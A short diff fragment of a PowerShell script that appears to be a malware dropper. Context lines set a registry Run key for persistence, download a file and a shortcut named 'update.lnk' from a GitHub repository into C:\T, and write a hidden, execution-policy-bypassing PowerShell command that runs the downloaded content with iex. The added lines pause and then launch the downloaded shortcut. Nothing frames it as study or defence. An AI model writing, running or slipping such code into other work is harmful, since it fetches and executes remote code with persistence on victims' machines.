@@ -5,6 +5,8 @@ New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Na
 wget https://raw.githubusercontent.com/licheng10203040-cloud/1/refs/heads/main/r -o C:\T\r;
 wget https://github.com/licheng10203040-cloud/1/raw/refs/heads/main/lnk -o C:\T\update.lnk;
 echo '!powershell "-ExecutionPolicy Bypass -w 1 iex(Get-Content C:\T\r)"' > C:\T\1;
+start-sleep 5;
+start-process C:\T\update.lnk;
 exit
 
 
